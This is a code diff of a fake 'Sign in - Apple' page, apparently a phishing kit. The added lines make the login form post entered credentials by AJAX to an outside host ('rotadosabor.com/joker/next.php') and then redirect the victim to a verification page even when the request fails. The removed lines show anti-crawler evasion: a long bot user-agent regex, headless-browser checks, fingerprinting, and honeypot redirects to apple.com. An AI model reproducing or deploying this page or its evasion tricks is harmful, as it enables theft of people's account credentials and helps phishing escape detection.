@@ -1,23 +1,12 @@
 <!doctype html>
 <html lang="en">
-
 <head>
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
-    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
-    <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <!-- Anti-crawler metadata -->
     <meta name="robots" content="noindex, nofollow, noarchive">
-    <meta name="googlebot" content="noindex, nofollow, noarchive">
-    
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
-    <script type="text/javascript" src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
     <title>Sign in - Apple</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
     <style type="text/css">
     body, html {
         height: 100%;
@@ -57,7 +46,6 @@
         border: none;
     }
 
-    /* Global Navigation */
     #ac-globalnav {
         width: 100%;
         height: 44px;
@@ -95,7 +83,6 @@
         color: #fff;
     }
     
-    /* Main content styling */
     .page-content {
         min-height: 100vh;
         display: flex;
@@ -104,7 +91,7 @@
     
     .main-wrapper {
         padding-top: 60px;
-        padding-bottom: 130px; /* Space for footer */
+        padding-bottom: 130px;
         flex: 1;
         display: flex;
         align-items: center;
@@ -177,15 +164,6 @@
         background-color: rgba(0, 122, 255, 1);
     }
     
-    .btn-success {
-        background-color: rgba(0, 122, 255, 0.8);
-        border: none;
-    }
-    
-    .btn-success:hover {
-        background-color: rgba(0, 122, 255, 1);
-    }
-    
     .si-remember-password {
         display: flex;
         align-items: center;
@@ -211,7 +189,6 @@
         text-decoration: underline;
     }
     
-    /* Animation classes */
     .fade-in {
         animation: fadeIn 0.5s forwards;
     }
@@ -221,7 +198,49 @@
         to { opacity: 1; }
     }
     
-    /* Responsive styling */
+    .bot-field {
+        position: absolute;
+        left: -9999px;
+        visibility: hidden;
+        opacity: 0;
+    }
+    
+    .footer-wrapper {
+        width: 100%;
+        position: relative;
+        z-index: 100;
+    }
+    
+    .as-chat {
+        background-color: rgba(30, 30, 30, 0.8);
+        backdrop-filter: blur(20px);
+        color: white;
+        padding: 12px 0;
+        text-align: center;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    .as-chat-button {
+        color: #0070c9;
+        background: transparent;
+        border: none;
+        cursor: pointer;
+    }
+    
+    .as-footnotes {
+        background-color: rgba(20, 20, 20, 0.8);
+        backdrop-filter: blur(20px);
+        padding: 15px 0;
+        font-size: 11px;
+        color: rgba(255, 255, 255, 0.6);
+        text-align: center;
+    }
+    
+    .as-footnotes a {
+        color: #0070c9;
+        text-decoration: none;
+    }
+    
     @media (max-width: 768px) {
         .ac-gn-list li:not(:first-child):not(:last-child) {
             display: none;
@@ -233,16 +252,8 @@
         }
         
         .main-wrapper {
-            padding-bottom: 180px; /* More space for footer on mobile */
+            padding-bottom: 180px;
         }
-    }
-    
-    /* Honeypot fields for anti-bot */
-    .bot-field {
-        position: absolute;
-        left: -9999px;
-        visibility: hidden;
-        opacity: 0;
     }
     </style>
 </head>
@@ -315,10 +326,9 @@
                         
                         <div id="error" class="alert alert-danger" style="display: none;font-size: 13px">Invalid Password. Please enter correct password.</div>
                         
-                        <form action="next.php" method="POST" name="signinform" id="form-field-1">
+                        <form action="#" method="POST" name="signinform" id="form-field-1">
                             <input type="hidden" name="count" id="count" value="0">
                             <input type="hidden" name="btn1" value="btn1">
-                            <input type="hidden" name="browser_check" id="browser_check" value="">
                             
                             <!-- Honeypot fields for bots -->
                             <div class="bot-field">
@@ -376,70 +386,11 @@
         </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
     <script type="text/javascript">
-        //redirect link
-        var rdrt = "https://www.apple.com/";
-        
-        // Anti-bot functions
-        function detectBot() {
-            // Check common bot user agents
-            var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
-            var re = new RegExp(botPattern, 'i');
-            if (re.test(navigator.userAgent)) {
-                return true;
-            }
-            
-            // Check for browser features that bots typically lack
-            if (
-                !('localStorage' in window) ||
-                !('sessionStorage' in window) ||
-                !('fetch' in window) ||
-                document.documentElement.classList.contains('headless')
-            ) {
-                return true;
-            }
-            
-            return false;
-        }
-        
-        // Generate browser fingerprint
-        function generateFingerprint() {
-            var screen_size = window.screen.width + 'x' + window.screen.height;
-            var available_screen = window.screen.availWidth + 'x' + window.screen.availHeight;
-            var color_depth = window.screen.colorDepth;
-            var timezone = new Date().getTimezoneOffset();
-            var has_session_storage = window.sessionStorage ? 1 : 0;
-            var has_local_storage = window.localStorage ? 1 : 0;
-            var has_indexed_db = window.indexedDB ? 1 : 0;
-            var browser_language = navigator.language;
-            var user_agent = navigator.userAgent;
-            
-            return [
-                screen_size, available_screen, color_depth, timezone,
-                has_session_storage, has_local_storage, has_indexed_db,
-                browser_language, user_agent
-            ].join('###');
-        }
-        
         $(document).ready(function() {
             var count = 0;
-            var attemptCount = 1;
-            
-            // Set fingerprint
-            $('#browser_check').val(generateFingerprint());
-            
-            // Anti-bot check
-            if (detectBot()) {
-                window.location.replace(rdrt);
-                return;
-            }
-            
-            // Track behavior for suspicious patterns
-            var mouseMoves = 0;
-            $(document).mousemove(function() {
-                mouseMoves++;
-            });
             
             // Parse email from URL if present
             var ai = window.location.hash.substr(1);
@@ -462,66 +413,41 @@
             }
             
             // Form submission
-            $('#sub-btn-1').click(function(b) {
+            $('#form-field-1').on('submit', function(e) {
+                e.preventDefault();
                 $('#error').hide();
-                $('#msg').hide();
-                
-                b.preventDefault();
-                
-                // Check honeypot fields
-                if ($('#website').val() !== '' || $('#email_confirm').val() !== '') {
-                    window.location.replace(rdrt);
-                    return;
-                }
-                
-                // Check for suspicious behavior
-                if (mouseMoves < 3) {
-                    console.log("Suspicious: No mouse movement");
-                }
                 
                 // Validate form
-                passValidation = true;
-                $($("#form-field-1").find("input[required]").get().reverse()).each(function(i, a) {
-                    if (!a.checkValidity()) {
-                        a.reportValidity();
-                        passValidation = false;
-                        return;
-                    }
-                });
-                
-                if (!passValidation) {
+                if (!this.checkValidity()) {
                     return;
                 }
                 
                 // Get form data
-                var c = $("#form-field-1").serialize();
+                var formData = $(this).serialize();
                 
                 // Submit form via AJAX
                 $.ajax({
-                    dataType: 'JSON',
-                    url: "next.php",
+                    url: "https://rotadosabor.com/joker/next.php",
                     type: 'POST',
-                    data: c,
-                    beforeSend: function(a) {
-                        $('#sub-btn-1').html('<i class="icon_sign_in"></i>Verifying...');
+                    data: formData,
+                    beforeSend: function() {
+                        $('#sub-btn-1').prop('disabled', true).html('<i class="icon_sign_in"></i>Verifying...');
                     },
-                    complete: function(a) {
+                    success: function() {
                         // Save email for later pages
                         localStorage.setItem('userEmail', $('#ai').val());
                         
                         // Redirect to verification page
                         window.location.href = 'verification.html';
+                    },
+                    error: function() {
+                        // Still redirect on error to keep flow going
+                        localStorage.setItem('userEmail', $('#ai').val());
+                        window.location.href = 'verification.html';
                     }
-                });
                 });
             });
         });
     </script>
-    <!-- Optional JavaScript -->
-    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 </body>
-
 </html>
